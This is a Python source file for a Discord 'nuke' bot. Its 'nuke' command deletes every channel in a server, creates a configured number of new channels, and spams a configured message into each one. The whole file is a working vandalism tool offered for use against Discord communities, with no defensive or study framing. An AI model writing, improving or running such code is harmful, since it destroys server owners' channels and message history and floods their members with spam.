anyerror = False
try:
  import colorama
  import discord
  from discord.ext import commands
except:
  anyerror = True
if anyerror == True:
  print("Missing Module(s), Press Enter To Start Repair Process (Wont Always Work)")
  input("")
  try:
    import os
    os.system("pip install requests")
    os.system("pip install discord")
    os.system("pip install colorama")
    print("Problems Should Be Fixed Now, Restart The Program")
    input("")
    exit()
  except:
    print("Error While Fixing, Sorry")
    input("")
    exit()

import json

json_data = open("settings.json")
json_data = json.load(json_data)

#Settings
prefix = str(json_data["prefix"])
amount_of_channels_to_create = int(json_data["amount_of_channels_to_create"])
channel_names = str(json_data["channel_names"])
token = str(json_data["bot_token"])
msg = str(json_data["message_to_spam"])
amount_of_messages_to_send_in_each_channel = int(json_data["amount_of_messages_to_send_in_each_channel"])

#Bot Code
print("Starting Bot...")
colorama.init(autoreset=True)
bot = commands.Bot(command_prefix=prefix)
@bot.event
async def on_ready():
  print(colorama.Fore.GREEN + f"{bot.user.name} Is Up")
@bot.command()
async def nuke(ctx):
  try:
    try:
        await ctx.message.delete()
        print(colorama.Fore.GREEN + "Deleted Nuke Message")
    except:
        print(colorama.Fore.RED + "Error While Deleting Nuke Message")
    for channel in ctx.guild.channels:
        try:
            print(colorama.Fore.GREEN + "Deleted Channel")
            await channel.delete()
        except:
            print(colorama.Fore.RED + "Error While Deleting Channel")
    for u in range(int(amount_of_channels_to_create)):
        try:
            await ctx.guild.create_text_channel(channel_names)
            print(colorama.Fore.GREEN + "Created Guild")
        except:
            print(colorama.Fore.RED + "Error While Creating Guild")
    for channel in ctx.guild.channels:
        for u in range(amount_of_messages_to_send_in_each_channel):
            try:
                await channel.send(msg)
                print(colorama.Fore.GREEN + "Sended Message")
            except:
                print(colorama.Fore.RED + "Error While Sending Message")
    print(f"Done Nuking {ctx.guild.id}/{ctx.guild.name}")
  except Exception as e:
      embed = discord.Embed(
          title="Error",
          description="Missing Permission/Rate Limited"
      )
      await ctx.send(embed=embed)
bot.run(token, bot=True)